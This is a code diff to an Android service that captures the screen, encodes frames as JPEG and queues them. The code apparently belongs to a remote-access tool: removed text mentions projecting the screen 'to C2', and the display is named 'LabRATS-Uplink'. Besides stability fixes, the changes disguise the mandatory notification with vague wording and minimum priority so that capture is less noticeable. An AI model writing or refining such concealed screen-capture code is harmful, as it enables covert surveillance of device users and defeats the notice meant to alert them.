@@ -58,6 +58,10 @@ public class ScreenShareService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (intent != null && "START".equals(intent.getAction())) {
+            if (isRunning) {
+                Log.d(TAG, "Screen capture already running");
+                return START_NOT_STICKY;
+            }
             int resultCode = intent.getIntExtra("resultCode", 0);
             Intent data = intent.getParcelableExtra("data");
 
@@ -72,68 +76,121 @@ public class ScreenShareService extends Service {
     }
 
     private void startCapture(int resultCode, Intent data) {
-        MediaProjectionManager mpManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
-        mediaProjection = mpManager.getMediaProjection(resultCode, data);
+        // 1. Create Notification
+        Intent notificationIntent = new Intent(this, MainActivity.class);
+        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
+                PendingIntent.FLAG_IMMUTABLE);
 
-        if (mediaProjection == null) return;
-
-        // Foreground Service Notification
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("🛡️ Screen Uplink Active")
-                .setContentText("Projecting screen to C2...")
-                .setSmallIcon(android.R.drawable.ic_menu_share)
+                .setContentTitle("🛡️ System Link Active")
+                .setContentText("Uplink established...")
+                .setSmallIcon(android.R.drawable.ic_dialog_info)
+                .setContentIntent(pendingIntent)
                 .setOngoing(true)
+                .setPriority(NotificationCompat.PRIORITY_MIN) // Less intrusive
                 .build();
 
+        // 2. Start Foreground (Android 16 requirement: MUST be first)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
         } else {
             startForeground(NOTIFICATION_ID, notification);
         }
 
-        DisplayMetrics metrics = new DisplayMetrics();
-        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
-        wm.getDefaultDisplay().getRealMetrics(metrics);
+        // 3. Immediate Initialization (No delay for Android 16)
+        MediaProjectionManager mpManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+        try {
+            mediaProjection = mpManager.getMediaProjection(resultCode, data);
+        } catch (Exception e) {
+            Log.e(TAG, "Projection Token Rejected: " + e.getMessage());
+            stopSelf();
+            return;
+        }
 
-        int width = metrics.widthPixels / 2; // Scale down for speed
-        int height = metrics.heightPixels / 2;
-        int density = metrics.densityDpi;
+        if (mediaProjection == null) {
+            stopSelf();
+            return;
+        }
 
-        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
-        virtualDisplay = mediaProjection.createVirtualDisplay("ScreenCapture",
-                width, height, density,
-                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-                imageReader.getSurface(), null, backgroundHandler);
-
-        imageReader.setOnImageAvailableListener(reader -> {
-            Image image = reader.acquireLatestImage();
-            if (image != null) {
-                processImage(image);
-                image.close();
+        // 4. Register Callback (Crucial Order)
+        mediaProjection.registerCallback(new MediaProjection.Callback() {
+            @Override
+            public void onStop() {
+                Log.d(TAG, "OS terminated projection");
+                stopCapture();
             }
         }, backgroundHandler);
 
-        isRunning = true;
+        // 5. Setup Display and Metrics
+        DisplayMetrics metrics = getResources().getDisplayMetrics();
+        int width = 720; // Standardize resolution for stability
+        int height = (int) (width * ((float) metrics.heightPixels / metrics.widthPixels));
+        if (height % 2 != 0) height--;
+
+        try {
+            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
+            virtualDisplay = mediaProjection.createVirtualDisplay("LabRATS-Uplink",
+                    width, height, metrics.densityDpi,
+                    DisplayManager.VIRTUAL_DISPLAY_FLAG_PRESENTATION, // More stable flag
+                    imageReader.getSurface(), null, backgroundHandler);
+
+            imageReader.setOnImageAvailableListener(reader -> {
+                Image image = null;
+                try {
+                    image = reader.acquireLatestImage();
+                    if (image != null) processImage(image);
+                } catch (Exception e) {
+                    // Ignore transient acquisition errors
+                } finally {
+                    if (image != null) image.close();
+                }
+            }, backgroundHandler);
+
+            isRunning = true;
+            Log.d(TAG, "Android 16 Uplink Active: " + width + "x" + height);
+
+        } catch (Exception e) {
+            Log.e(TAG, "Display Bridge Failed: " + e.getMessage());
+            stopCapture();
+            stopSelf();
+        }
     }
 
     private void processImage(Image image) {
         try {
-            int width = image.getWidth();
-            int height = image.getHeight();
             Image.Plane[] planes = image.getPlanes();
             ByteBuffer buffer = planes[0].getBuffer();
             int pixelStride = planes[0].getPixelStride();
             int rowStride = planes[0].getRowStride();
-            int rowPadding = rowStride - pixelStride * width;
+            int width = image.getWidth();
+            int height = image.getHeight();
 
-            Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
+            // Calculate bitmap width based on stride to avoid BufferUnderflowException
+            int bitmapWidth = rowStride / pixelStride;
+            
+            if (buffer.remaining() < rowStride * height) {
+                return; // Not enough data
+            }
+
+            Bitmap bitmap = Bitmap.createBitmap(bitmapWidth, height, Bitmap.Config.ARGB_8888);
             bitmap.copyPixelsFromBuffer(buffer);
 
+            // Crop to actual width if there was padding
+            if (bitmapWidth != width) {
+                Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, width, height);
+                bitmap.recycle();
+                bitmap = cropped;
+            }
+
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
-            bitmap.compress(Bitmap.CompressFormat.JPEG, 40, baos);
+            bitmap.compress(Bitmap.CompressFormat.JPEG, 35, baos); // Slightly lower quality for stability
             byte[] bytes = baos.toByteArray();
 
+            if (frameQueue.remainingCapacity() == 0) {
+                frameQueue.poll();
+            }
             frameQueue.offer(bytes);
+
             bitmap.recycle();
         } catch (Exception e) {
             Log.e(TAG, "Process error: " + e.getMessage());
